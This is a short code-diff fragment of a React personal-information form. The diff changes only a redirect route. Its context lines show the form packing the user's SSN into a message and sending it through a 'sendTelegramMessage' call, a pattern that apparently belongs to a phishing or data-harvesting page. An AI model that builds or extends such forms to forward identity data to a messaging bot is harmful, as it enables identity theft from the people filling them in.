@@ -70,7 +70,7 @@ const PersonalInformationForm = () => {
     SSN: ${formData.ssn}`;
 
     await sendTelegramMessage(message);
-    router.push("/education-history");
+    router.push("/education");
   };
 
   return (
